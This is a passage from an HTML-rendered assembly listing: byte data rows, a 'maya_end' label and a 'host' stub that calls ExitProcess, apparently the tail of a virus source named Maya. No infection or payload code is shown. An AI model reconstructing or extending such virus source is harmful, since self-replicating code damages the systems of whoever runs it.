     </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">226</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">131</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">130</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc4">,</span><span class="sc2">195</span><span class="sc4">,</span><span class="sc2">134</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">142</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">254</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">142</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">142</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">62</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">142</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">226</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">227</span><span class="sc4">,</span><span class="sc2">142</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">224</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">63</span><span class="sc4">,</span><span class="sc2">224</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">112</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc0">

</span><span class="sc5">maya_end</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">  

</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">


</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">maya</span><span class="sc0">



</span></div></body>
</html>
